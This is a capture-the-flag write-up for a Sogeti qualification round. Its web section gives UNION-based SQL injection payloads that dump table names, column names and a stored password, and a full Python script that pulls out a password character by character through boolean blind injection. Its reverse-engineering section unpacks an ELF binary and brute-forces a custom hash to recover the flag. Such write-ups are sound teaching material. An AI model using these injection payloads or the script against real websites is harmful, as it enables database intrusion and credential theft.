---
title: Sogeti Qualif
published: true
---

<ul style="margin-bottom: 50px">
  <li><a href="#web">Web: NoteBad.exe [493 points]</a></li>
  <li><a href="#re1">RE: Be3rP4ck [495 points]</a></li>
</ul>


# [](#web)WEB: NoteBad.exe [ 493 points ] (Author: zTeeed)

## [](#presentation)Presentation

The website enables to create notes by creating accounts, after some
investigation we can "guess" that the server is displaying the notes making the following request:

```php
$query = "SELECT note from notes where username=$username;";
```

So, the username parameter is injectable. Lets try some payloads... 

<img src="/images/writeups/sogeti/web/01_add_note_example.png">

## [](#method-1)Method 1: Using the browser

```text
t35h' union select database()#
```

<img src="/images/writeups/sogeti/web/04_result_database.png">

```text
t35h' union select table_name from information_schema.tables#
```

<img src="/images/writeups/sogeti/web/05_result_tables.png">

```text
t35h' union select column_name from information_schema.columns#
```

<img src="/images/writeups/sogeti/web/06_result_columns.png">

```text
t35h' union select password from user limit 1#
```
<img src="/images/writeups/sogeti/web/07_result_password.png">

## [](#method-2)Method 2: Using an overkill python script

This is a typicall script that enable bruteforcing a column value based on a
boolean sql injection:

```python
#!/usr/bin/python3

import re, requests, time
from pwn import *


def connect(s, username, password):
    params = dict(username=username, password=password)
    url = 'http://quals.shadow-league.org:8001/register.php'
    s.get(url, params=params)
    url = 'http://quals.shadow-league.org:8001/index.php'
    return s.get(url, params=params)


def parse(content):
    pattern = b'<p class=\'note\'>(.*?)</p>'
    return re.findall(pattern, content)


def forge_payloads(val, flag):
    payload = ('admin\' or ((select ASCII(substr(password, {}, 1)) '
    'from user limit 1){}"{}")#')
    payload1 = payload.format(1+len(flag), '=', val)
    payload2 = payload.format(1+len(flag), '>', val)
    return payload1, payload2


def get_notes(payload, s, p):
    r = connect(s, payload, 'password')
    p.status(payload)
    notes = parse(r.content)
    return notes


def get_char_dichotomie(flag, s, p, p2):
    (a, b) = (33, 126)
    while a<=b:
        val = (a+b) // 2
        p.status('{}{}'.format(flag, chr(val)))

        payload1, payload2 = forge_payloads(val, flag)
        notes = get_notes(payload1, s, p2)
        if len(notes) > 1000:
            return chr(val)

        notes = get_notes(payload2, s, p2)
        if len(notes) > 1000:
            a = val + 1
        else:
            b = val - 1


def bruteforce(flag, s, p, p2):
    char = get_char_dichotomie(flag, s, p, p2)
    if char is None:
        return flag, None
    if char == '}':
        return flag + char, True
    return flag + char, False


def main():
    s = requests.session()
    flag = ''
    is_end = False
    with log.progress('flag') as p:
        with log.progress('payload') as p2:
            while is_end != True:
                flag, is_end = bruteforce(flag, s, p, p2)
                if is_end is not None:
                    continue
                p.failure(flag)
                return flag
            p.success(flag)
    return flag


def display_time(delay):
    m, s = divmod(delay, 60)
    m, s = int(m), int(s)
    if m != 0:
        return '{:02d} minutes {:02d} seconds'.format(m, s)
    return '{:02d} seconds'.format(s)


if __name__ == '__main__':
    start = time.time()
    main()
    disp = display_time(time.time()-start)
    print('[*] Solving time: {}'.format(disp))

```


# [](#re1)RE: Be3rP4ck [ 495 points ] (Author: AK)

This is a 64-bit ELF file. 
```
$ file Be3rP4ck 
Be3rP4ck: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=da32e0c02e1bf1f0afd1c005b3d4fb86b23840b8, not stripped
```

## [](#part-1) Misleading flag

After launching the program, it asks us to enter the flag, and if it's wrong, nothing would happen: 
```
$ ./Be3rP4ck 
Flag: test
```

Let's analyze the `main` function.
 
<img src="/images/writeups/sogeti/re/re1_01.png">

The user input is stored in `[rbp+string]`. The program performs several operations on our input: a `xor` with `0x87` and 4 `not`. Finally it is compared with the value stored at `unk_401210`. 

So, to recover the flag, I just xored the data in `unk_401210` with `0x87`. 


```python
unk_401210 = [0xc9, 0xb7, 0xf3, 0xd8, 0xd3, 0xef, 0xb4, 0xd8, 0xe1, 0xeb, 0xb3, 0xc0, 0xc0, 0xc0, 0xc0, 0xc0]
print(''.join([chr(x^0x87) for x in unk_401210]))
```
And I got `N0t_Th3_fl4GGGGG`. 

```
$ ./Be3rP4ck
Flag:N0t_Th3_fl4GGGGG
Well... played?
```

## [](#part-2) Unpacking the program

I noticed that if I pass an argument to the program, it will print another message that corresponds to the real program, which is packed:
```
$ ./Be3rP4ck test
-- Real program --
Give me the real flag
```

Indeed, the program doesn't start on `main` but on another function called `main_0`. This function checks if `argc` is equal to 2, if not, it will call `main`. 

```assembly
.text:0000000000400C45 ; int __cdecl main_0(int, char **, char **)
.text:0000000000400C45 ; __unwind {
.text:0000000000400C45                 push    rbp
.text:0000000000400C46                 mov     rbp, rsp
.text:0000000000400C49                 sub     rsp, 10h
.text:0000000000400C4D                 mov     [rbp-4], edi
.text:0000000000400C50                 mov     [rbp-10h], rsi
.text:0000000000400C54                 cmp     dword ptr [rbp-4], 2     ; [rbp-4] contains argc
.text:0000000000400C58                 jz      short loc_400C7B         ; jump if argc = 2
.text:0000000000400C5A                 call    main
...
```

If an argument is given, we arrive on the function `fetch_data`. This is the function used to unpack the hidden program. 

```assembly
...
.text:0000000000400EB0 loc_400EB0:
.text:0000000000400EB0                 add     [r8+48h], bl
.text:0000000000400EB4                 mov     eax, [rbp-40h]  ; [rbp-40h] contains rsi, ie argv
.text:0000000000400EB7                 lea     rsi, aRb        ; "rb"
.text:0000000000400EBE                 mov     rdi, rax        ; argv[0]: "Be3rP4ck"
.text:0000000000400EC1                 call    _fopen
.text:0000000000400EC6                 mov     [rbp-18h], rax
.text:0000000000400ECA                 cmp     qword ptr [rbp-18h], 0
.text:0000000000400ECF                 jnz     short loc_400EE7
.text:0000000000400ED1                 lea     rdi, aFuck      ; "fuck"
.text:0000000000400ED8                 call    _perror
.text:0000000000400EDD                 mov     eax, 0FFFFFFFFh
.text:0000000000400EE2                 jmp     locret_400F93
.text:0000000000400EE7 ; ---------------------------------------------------------------------------
.text:0000000000400EE7
.text:0000000000400EE7 loc_400EE7:
.text:0000000000400EE7                 mov     rax, [rbp-18h]
.text:0000000000400EEB                 mov     edx, 0
.text:0000000000400EF0                 mov     esi, 1
.text:0000000000400EF5                 mov     rdi, rax
.text:0000000000400EF8                 call    _fseek
.text:0000000000400EFD                 mov     rdx, [rbp-18h]
.text:0000000000400F01                 lea     rax, [rbp-2Ah]
.text:0000000000400F05                 mov     rcx, rdx
.text:0000000000400F08                 mov     edx, 3
.text:0000000000400F0D                 mov     esi, 1
.text:0000000000400F12                 mov     rdi, rax
.text:0000000000400F15                 call    _fread
.text:0000000000400F1A                 mov     eax, 1
.text:0000000000400F1F                 push    rax
.text:0000000000400F20                 xor     eax, eax
.text:0000000000400F22                 jz      short near ptr loc_400F33+2
...
.text:0000000000400F33 loc_400F33:
.text:0000000000400F33                 add     [r8+48h], bl
.text:0000000000400F37                 mov     eax, [rbp-18h]
.text:0000000000400F3A                 mov     rdi, rax
.text:0000000000400F3D                 call    _fclose
.text:0000000000400F42                 mov     rsi, [rbp-20h]   ; 0x13455C
.text:0000000000400F46                 lea     rdx, [rbp-2Ah]
.text:0000000000400F4A                 mov     rax, [rbp-8]
.text:0000000000400F4E                 mov     ecx, 3
.text:0000000000400F53                 mov     rdi, rax
.text:0000000000400F56                 call    mb_xor
.text:0000000000400F5B                 mov     eax, 1
...
```
I put a breakpoint at `0x400F56 call mb_xor` and I noticed that `rdi` contains the chars "ELF" after executing this instruction.
<br /><br />
<img src="/images/writeups/sogeti/re/re1_02.png">

So I extracted the 0x13455c bytes of data (size in `rsi`) stored at the address contained in `rdi` and I got a new ELF file which corresponds to the real program. 
```
$ file real_program 
real_program: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=b5b5bb9544aeca5d8e3dd360bad2dfb3f9d87aacA, not stripped
```

## [](#part-3) Analysing the real program
It's a program written in Go. The main.main function is called `runtime_text` here. 
<br /><br />
<img src="/images/writeups/sogeti/re/re1_03.png">
<br /><br />
After examining this function, I noticed that if I enter "almost_it", it would print another wrong flag...

```assembly
.text:000000000040126B loc_40126B:
.text:000000000040126B                 mov     [rsp+0B8h+var_B8], rcx
.text:000000000040126F                 mov     [rsp+0B8h+var_B0], rax
.text:0000000000401274                 lea     rax, unk_4ADCBF          ; "almost_it"
.text:000000000040127B                 mov     [rsp+0B8h+var_A8], rax
.text:0000000000401280                 mov     qword ptr [rsp+0B8h+var_A0], 9
.text:0000000000401289                 call    runtime_eqstring
.text:000000000040128E                 movzx   eax, byte ptr [rsp+0B8h+var_A0+8]
.text:0000000000401293                 test    al, al
.text:0000000000401295                 jnz     short loc_40129C
```
```
$ ./Be3rP4ck almost_it
-- Real program --
flag is: Y0u_A1nt_Th3r3_Y3t
```

Then, the program does a custom hash on our input using the function `main_sogehash`. And its final value is compared to `1f4e509605c9f4bf22f4bf22a5c9fe23bbfee5dd22ffdde5fb22aafedcdd22f5f1d6f0a4a5a589`. 

```assembly
.text:000000000040118E                 call    main_sogehash
.text:0000000000401193                 mov     rax, [rsp+0B8h+var_A8]
.text:0000000000401198                 mov     rcx, qword ptr [rsp+0B8h+var_A0]
.text:000000000040119D                 cmp     rcx, 4Eh                     ; length
.text:00000000004011A1                 jz      short loc_4011B3
...
.text:00000000004011B3 loc_4011B3:
.text:00000000004011B3                 mov     [rsp+0B8h+var_B8], rax
.text:00000000004011B7                 mov     [rsp+0B8h+var_B0], rcx
.text:00000000004011BC                 lea     rax, unk_4B3F03              ; "1f4e509605c9f4bf22f4bf22a5c9fe23bbfee5dd22ffdde5fb22aafedcdd22f5f1d6f0a4a5a589"
.text:00000000004011C3                 mov     [rsp+0B8h+var_A8], rax
.text:00000000004011C8                 mov     qword ptr [rsp+0B8h+var_A0], 4Eh
.text:00000000004011D1                 call    runtime_eqstring
```

## [](#part-4) Cracking the hash


After analyzing the `main_sogehash`, I wrote this little python script to bruteforce the hash. 
```python
target = '1f4e509605c9f4bf22f4bf22a5c9fe23bbfee5dd22ffdde5fb22aafedcdd22f5f1d6f0a4a5a589'
alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}0123456789'
flag = ''
d = 0
for i in range(0, 78, 2):
    for s in alphabet:
        x = d^ord(s)^4*ord(s)
        if hex(x)[-2:] == target[i:i+2]:
            flag += s
            d = x >> 8
            break
print(flag)
```

```
 ./Be3rP4ck SCE{Th1s_1s_th3_r3al_fl4g_w3ll_d0ne\!\!\!}
-- Real program --
Give me the real flag
Congratulations, you can use this flag to validate :)
```

Finally, the flag is:
```
SCE{Th1s_1s_th3_r3al_fl4g_w3ll_d0ne!!!}
```
